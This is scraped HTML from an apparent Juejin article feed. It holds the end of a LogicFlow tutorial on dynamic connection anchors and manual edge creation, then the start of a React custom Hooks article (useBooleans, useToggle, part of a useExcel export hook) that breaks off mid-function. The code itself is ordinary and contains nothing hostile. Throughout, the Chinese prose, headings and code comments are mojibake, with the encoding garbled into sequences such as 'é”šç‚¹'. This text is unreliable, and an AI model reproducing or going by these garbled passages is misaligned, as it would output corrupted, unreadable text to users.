  <span class="hljs-comment">// é”šç‚¹å¼€å§‹æ‹–æ‹½ï¼šè®°å½•æºèŠ‚ç‚¹å’Œæºé”šç‚¹ä¿¡æ¯</span>
  lf.<span class="hljs-title function_">on</span>(<span class="hljs-string">"anchor:dragstart"</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    store.<span class="hljs-property">draggingInfo</span> = data; 
    store.<span class="hljs-property">isManualConnected</span> = <span class="hljs-literal">false</span>;
  });

  <span class="hljs-comment">// é”šç‚¹æ‹–æ‹½ç»“æŸï¼šæ¸…ç©ºä¿¡æ¯</span>
  lf.<span class="hljs-title function_">on</span>(<span class="hljs-string">"anchor:dragend"</span>, <span class="hljs-function">() =&gt;</span> {
    store.<span class="hljs-property">draggingInfo</span> = <span class="hljs-literal">null</span>;
  });
}
</code></pre>
<p>æœ‰äº†è¿™ä¸ªé“ºå«ï¼Œå’±ä»¬çš„è‡ªå®šä¹‰é”šç‚¹å°±èƒ½çŸ¥é“ "è°åœ¨è¿æˆ‘" äº†ï¼ğŸ˜</p>
<h3 data-id="heading-6">ç¬¬4ï¸âƒ£æ­¥ï¼šæ‰‹åŠ¨è¿çº¿é€»è¾‘</h3>
<p>ä½ å¯èƒ½æ³¨æ„åˆ°äº†ï¼Œé”šç‚¹ä½ç½®æ˜¯â€œåŠ¨â€çš„ï¼Œä½† LogicFlow çš„è¿çº¿è®¡ç®—é€šå¸¸åŸºäºå›ºå®šçš„é”šç‚¹åæ ‡ã€‚å¦‚æœæˆ‘ä»¬ä¸åšå¤„ç†ï¼Œå¯èƒ½ä¼šå‡ºç°è¿çº¿è¿ä¸ä¸Šçš„æƒ…å†µã€‚ï¼ˆå…¶å®è‚¯å®šæ˜¯è¿ä¸ä¸Šçš„ğŸ˜‚ï¼‰</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ <code>handleMouseUp</code>ï¼ˆé¼ æ ‡æŠ¬èµ·ï¼‰æ—¶ï¼Œæ‰‹åŠ¨å¸® LogicFlow å»ºç«‹è¿çº¿ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customAnchor.js</span>
<span class="hljs-keyword">import</span> { useLogicFlowStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/stores/logicFlow"</span>;

  <span class="hljs-comment">// ... åœ¨ createCustomAnchor å†…éƒ¨ ...</span>

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseUp</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useLogicFlowStore</span>();
    <span class="hljs-comment">// è·å–å…¨å±€å­˜å‚¨çš„æ‹–æ‹½ä¿¡æ¯</span>
    <span class="hljs-keyword">const</span> { draggingInfo } = store; 
    
    <span class="hljs-comment">// å°è¯•æ‰‹åŠ¨å»ºç«‹è¿æ¥</span>
    <span class="hljs-keyword">if</span> (draggingInfo &amp;&amp; graphModel) {
      <span class="hljs-keyword">const</span> sourceNode = draggingInfo.<span class="hljs-property">nodeModel</span>;
      <span class="hljs-keyword">const</span> sourceAnchor = draggingInfo.<span class="hljs-property">data</span>;
      
      <span class="hljs-comment">// 1. åŸºç¡€æ ¡éªŒï¼šé¿å…è‡ªè¿</span>
      <span class="hljs-keyword">if</span> (sourceAnchor.<span class="hljs-property">id</span> === id) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 2. æ„é€ è¾¹æ•°æ®</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œæˆ‘ä»¬æŠŠç»ˆç‚¹ (endPoint) å¼ºåˆ¶è®¾ä¸ºå½“å‰é¼ æ ‡/é”šç‚¹çš„è§†è§‰ä½ç½® {x, y}</span>
        <span class="hljs-comment">// è€Œä¸æ˜¯èŠ‚ç‚¹åŸæœ¬å®šä¹‰çš„é™æ€é”šç‚¹ä½ç½®</span>
        <span class="hljs-keyword">const</span> edgeData = {
            <span class="hljs-attr">type</span>: <span class="hljs-string">"bezier"</span>, <span class="hljs-comment">// è´å¡å°”æ›²çº¿</span>
            <span class="hljs-attr">sourceNodeId</span>: sourceNode.<span class="hljs-property">id</span>,
            <span class="hljs-attr">sourceAnchorId</span>: sourceAnchor.<span class="hljs-property">id</span>,
            <span class="hljs-attr">targetNodeId</span>: nodeModel.<span class="hljs-property">id</span>,
            <span class="hljs-attr">targetAnchorId</span>: id,
            <span class="hljs-attr">startPoint</span>: { <span class="hljs-attr">x</span>: sourceAnchor.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: sourceAnchor.<span class="hljs-property">y</span> },
            <span class="hljs-attr">endPoint</span>: { x, y }, <span class="hljs-comment">// &lt;--- â°å…³é”®ï¼ä½¿ç”¨å½“å‰çš„åŠ¨æ€åæ ‡</span>
        };

        <span class="hljs-comment">// 3. æ ¸å¿ƒï¼šæ‰‹åŠ¨è°ƒç”¨ graphModel.addEdge æ·»åŠ è¾¹</span>
        graphModel.<span class="hljs-title function_">addEdge</span>(edgeData);
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ‰‹åŠ¨è¿æ¥å¤±è´¥"</span>, error);
      }
    }
  }
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œå½“ç”¨æˆ·ä»ä¸€ä¸ªèŠ‚ç‚¹æ‹–æ‹½è¿çº¿åˆ°æˆ‘ä»¬çš„åŠ¨æ€é”šç‚¹ä¸Šæ¾å¼€é¼ æ ‡æ—¶ï¼Œå°±èƒ½ç²¾å‡†åœ°å»ºç«‹è¿æ¥äº†ï¼ä¸ç®¡ä½ çš„é”šç‚¹ "è·‘" åˆ°äº†å“ªé‡Œï¼Œè¿çº¿éƒ½èƒ½å‡†ç¡®è¿½è¸ªã€‚ğŸ¯</p>
<h2 data-id="heading-7">æ€»ç»“</h2>
<p>é€šè¿‡è¿™æ¬¡æ”¹é€ ï¼Œå’±ä»¬çš„æµç¨‹å›¾ç¼–è¾‘ä½“éªŒå¾—åˆ°äº†"è´¨"çš„é£è·ƒä½“éªŒï¼š</p>
<ol>
<li><strong>çµåŠ¨</strong>ï¼šé”šç‚¹ä¸å†æ˜¯æ­»æ¿çš„é’‰å­ï¼Œè€Œæ˜¯ä¼šäº’åŠ¨çš„ç²¾çµã€‚ğŸ‘»</li>
<li><strong>é«˜æ•ˆ</strong>ï¼šå¢å¤§äº†é¼ æ ‡æ„Ÿåº”åŒºåŸŸï¼Œç”¨æˆ·è¿çº¿æ›´è½»æ¾ï¼Œæ— éœ€åƒç´ çº§ç„å‡†ã€‚</li>
<li><strong>ç¾è§‚</strong>ï¼šå¹³æ—¶éšè—ï¼Œç”¨æ—¶æ˜¾ç°ï¼Œä¿æŒäº†ç”»å¸ƒçš„æ•´æ´ã€‚</li>
</ol>
<p>å¸Œæœ›è¿™ä¸ªæ–¹æ¡ˆèƒ½ç»™æ­£åœ¨ä½¿ç”¨ LogicFlow çš„å°ä¼™ä¼´ä»¬ä¸€äº›çµæ„Ÿå§ï¼ğŸ’¡</p>
<br/>
<hr/>
<p><br/><br/></p>
<p>è‡³æ­¤ï¼Œæœ¬ç¯‡æ–‡ç« å°±å†™å®Œå•¦ï¼Œæ’’èŠ±æ’’èŠ±ã€‚</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b2198fba2b674f1b935a63e4abb3cbd7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=90&amp;h=90&amp;s=8866&amp;e=png&amp;b=fcfcfc" alt="image.png" loading="lazy"/></p>
<p>å¸Œæœ›æœ¬æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¦‚æœ‰ä»»ä½•ç–‘é—®ï¼ŒæœŸå¾…ä½ çš„ç•™è¨€å“¦ã€‚<br/>
è€æ ·å­ï¼Œç‚¹èµ+è¯„è®º=ä½ ä¼šäº†ï¼Œæ”¶è—=ä½ ç²¾é€šäº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Reactè‡ªå®šä¹‰Hooks]]></title>    <link>https://juejin.cn/post/7589082912588611627</link>    <guid>https://juejin.cn/post/7589082912588611627</guid>    <pubDate>2025-12-29T10:25:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588611627" data-draft-id="7589099845186437156" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Reactè‡ªå®šä¹‰Hooks"/> <meta itemprop="keywords" content="TypeScript,å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-29T10:25:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹æ—ä¸æƒ³è¯´è¯"/> <meta itemprop="url" content="https://juejin.cn/user/2963939079754030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Reactè‡ªå®šä¹‰Hooks
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939079754030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹æ—ä¸æƒ³è¯´è¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:25:50.000Z" title="Mon Dec 29 2025 10:25:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è‡ªå®šä¹‰ä¸€äº›å¸¸è§çš„hookï¼Œæ–¹ä¾¿åœ¨å·¥ä½œä¸­ä½¿ç”¨ï¼Œä»¥ä¸‹å†…å®¹éƒ½æ˜¯æœ¬äººå·¥ä½œä¸­çš„ä½¿ç”¨ç»éªŒï¼Œä¸è¶³ä¹‹å¤„ï¼Œæ¬¢è¿æŒ‡æ­£</p>
<h3 data-id="heading-0">useBooleans</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> åˆ‡æ¢true/falseçš„å…¬å…±hook
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Boolean</span>} initValue é»˜è®¤å€¼
 */</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseBooleansActions</span> {
  <span class="hljs-attr">toggle</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// åˆ‡æ¢å€¼</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®å€¼</span>
  <span class="hljs-attr">setTrue</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®ä¸ºtrue</span>
  <span class="hljs-attr">setFalse</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®å€¼ä¸ºfalse</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// é‡ç½®ä¸ºåˆå§‹å€¼</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useBooleans</span>(<span class="hljs-params">initValue = <span class="hljs-literal">false</span></span>): [<span class="hljs-built_in">boolean</span>, <span class="hljs-title class_">UseBooleansActions</span>] {
  <span class="hljs-keyword">const</span> [value, setValue] = useState&lt;<span class="hljs-built_in">boolean</span>&gt;(initValue)

  <span class="hljs-comment">/** åˆ‡æ¢å€¼ */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> !pre)
  }

  <span class="hljs-comment">/** è®¾ç½®å€¼ */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt; {
    <span class="hljs-title function_">setValue</span>(value)
  }

  <span class="hljs-comment">/** è®¾ç½®ä¸ºtrue */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setTrue</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-literal">true</span>)
  }

  <span class="hljs-comment">/** è®¾ç½®ä¸ºfalse */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setFalse</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-literal">false</span>)
  }

  <span class="hljs-comment">/** é‡ç½®ä¸ºåˆå§‹å€¼ */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(initValue)
  }

  <span class="hljs-keyword">return</span> [value, { toggle, set, setTrue, setFalse, reset }]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useBooleans

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> [booleanValue, { toggle, setTrue, setFalse, reset, set }] = <span class="hljs-title function_">useBooleans</span>(<span class="hljs-literal">true</span>)
</code></pre>
<h3 data-id="heading-1">useToggle</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å®šä¹‰æ“ä½œæ–¹æ³•çš„æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T, U&gt; {
  <span class="hljs-attr">toggle</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">value: T | U</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">setLeft</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®ä¸ºé»˜è®¤å€¼</span>
  <span class="hljs-attr">setRight</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®ä¸ºå–åå€¼</span>
}

<span class="hljs-keyword">function</span> useToggle&lt;T = <span class="hljs-built_in">boolean</span>&gt;(
  defaultValue?: T,
  reverseValue?: T,
): [T, <span class="hljs-title class_">Actions</span>&lt;T, T&gt;]

<span class="hljs-keyword">function</span> useToggle&lt;T, U&gt;(
  <span class="hljs-attr">defaultValue</span>: T,
  <span class="hljs-attr">reverseValue</span>: U,
): [T | U, <span class="hljs-title class_">Actions</span>&lt;T | U, T | U&gt;]

<span class="hljs-keyword">function</span> useToggle&lt;D, R&gt;(
  <span class="hljs-attr">defaultValue</span>: D = <span class="hljs-literal">false</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> D,
  reverseValue?: R,
) {
  <span class="hljs-comment">// çŠ¶æ€ç®¡ç†ï¼šæ”¯æŒé»˜è®¤å€¼å’Œå–åå€¼</span>
  <span class="hljs-keyword">const</span> [state, setState] = useState&lt;D | R&gt;(defaultValue)

  <span class="hljs-comment">// è®¡ç®—å®é™…çš„å–åå€¼ï¼ˆè‹¥æœªæä¾›åˆ™ä½¿ç”¨å¸ƒå°”å–åï¼‰</span>
  <span class="hljs-keyword">const</span> reverseValueOrigin =
    reverseValue === <span class="hljs-literal">undefined</span> ? !defaultValue : reverseValue

  <span class="hljs-comment">// ç¼“å­˜æ“ä½œæ–¹æ³•é¿å…é‡å¤åˆ›å»º</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ ¸å¿ƒåˆ‡æ¢é€»è¾‘ï¼šåœ¨é»˜è®¤å€¼å’Œå–åå€¼ä¹‹é—´åˆ‡æ¢</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"/>) =&gt;
      <span class="hljs-title function_">setState</span>(
        <span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span>
          (s === defaultValue ? reverseValueOrigin : defaultValue) <span class="hljs-keyword">as</span> D | R,
      )
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">value: D | R</span>) =&gt; <span class="hljs-title function_">setState</span>(value)
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">setLeft</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setState</span>(defaultValue)
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">setRight</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setState</span>(reverseValueOrigin <span class="hljs-keyword">as</span> D | R)

    <span class="hljs-keyword">return</span> { toggle, set, setLeft, setRight }
  }, [defaultValue, reverseValueOrigin])

  <span class="hljs-keyword">return</span> [state, actions]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useToggle

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> [toggleValue, { <span class="hljs-attr">toggle</span>: toggle1, <span class="hljs-attr">set</span>: set1, setLeft, setRight }] =
    useToggle&lt;<span class="hljs-string">'left'</span>, <span class="hljs-string">'right'</span>&gt;(<span class="hljs-string">'left'</span>, <span class="hljs-string">'right'</span>)
</code></pre>
<h3 data-id="heading-2">useExcel</h3>
<p>åŸºäºxlsxçš„ä¸€äº›å¸¸è§çš„å¯¼å…¥å¯¼å‡ºåŠŸèƒ½å°è£…</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf, isAvailableArr } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { message } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">BookType</span>,
  <span class="hljs-title class_">ColInfo</span>,
  <span class="hljs-title class_">Range</span>,
  <span class="hljs-title class_">RowInfo</span>,
  <span class="hljs-title class_">Sheet2JSONOpts</span>,
  <span class="hljs-title class_">WorkBook</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'xlsx'</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">XLSX</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'xlsx'</span>

<span class="hljs-comment">// å¯¼å‡ºæ–‡ä»¶é…ç½®</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">IExportConfig</span> = {
  name?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// å¯¼å‡ºæ–‡ä»¶åç§°</span>
  bookType?: <span class="hljs-title class_">BookType</span> <span class="hljs-comment">// å¯¼å‡ºæ–‡ä»¶ç±»å‹</span>
  sheetName?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// sheetåç§°</span>
  errorMsg?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// é”™è¯¯æç¤º</span>
  headers?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; <span class="hljs-comment">// è‡ªå®šä¹‰è¡¨å¤´ï¼Œå¯¼å‡ºçš„æ–‡ä»¶é‡Œé¢åªæœ‰åœ¨å®šä¹‰ä¸­çš„å­—æ®µï¼Œå¹¶ä¸”å¦‚æœæ•°æ®ä¸ºç©ºçš„è¯ï¼Œåªç”Ÿæˆä¸€ä¸ªè¡¨å¤´ã€‚ç¤ºä¾‹ï¼š{id: 'ID', name: 'é“¾æ¥åç§°', site_type: 'å®˜ç½‘ç±»å‹'}</span>
  merges?: <span class="hljs-title class_">Range</span>[] <span class="hljs-comment">// å•å…ƒæ ¼åˆå¹¶</span>
  colInfo?: <span class="hljs-title class_">ColInfo</span>[] <span class="hljs-comment">// åˆ—å±æ€§</span>
  rowInfo?: <span class="hljs-title class_">RowInfo</span>[] <span class="hljs-comment">// è¡Œå±æ€§</span>
}

<span class="hljs-comment">// å¤šsheetå¯¼å‡º</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">IExtraSheetConfig</span> = {
  name?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// å¯¼å‡ºæ–‡ä»¶åç§°</span>
  bookType?: <span class="hljs-title class_">BookType</span> <span class="hljs-comment">// å¯¼å‡ºæ–‡ä»¶ç±»å‹</span>
  <span class="hljs-attr">sheets</span>: ({ <span class="hljs-attr">json</span>: <span class="hljs-built_in">any</span>[] } &amp; <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">IExportConfig</span>, <span class="hljs-string">'name'</span> | <span class="hljs-string">'bookType'</span>&gt;)[]
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> è‡ªå®šä¹‰å¯¼å‡ºæ–‡ä»¶hook
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useExcel</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä¸€ç»´æ•°ç»„å¯¼å‡ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°å°†ä¸€ä¸ªä¸€ç»´æ•°ç»„è½¬æ¢ä¸ºExcelæ–‡ä»¶å¹¶ä¸‹è½½
   * æ”¯æŒè‡ªå®šä¹‰è¡¨å¤´ã€å•å…ƒæ ¼åˆå¹¶ã€åˆ—å±æ€§å’Œè¡Œå±æ€§
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[]</span>} <span class="hljs-variable">json</span> - è¦å¯¼å‡ºçš„æ•°æ®æ•°ç»„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - å¯¼å‡ºé…ç½®é¡¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='å¯¼å‡º'] - å¯¼å‡ºæ–‡ä»¶åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - å¯¼å‡ºæ–‡ä»¶ç±»å‹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.sheetName='Sheet1'] - å·¥ä½œè¡¨åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [config.headers] - è‡ªå®šä¹‰è¡¨å¤´æ˜ å°„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [config.merges] - å•å…ƒæ ¼åˆå¹¶èŒƒå›´
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [config.colInfo] - åˆ—å±æ€§é…ç½®
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [config.rowInfo] - è¡Œå±æ€§é…ç½®
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportJson2Excel&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">json</span>: T[], config?: <span class="hljs-title class_">IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'å¯¼å‡º'</span>,
      sheetName = <span class="hljs-string">'Sheet1'</span>,
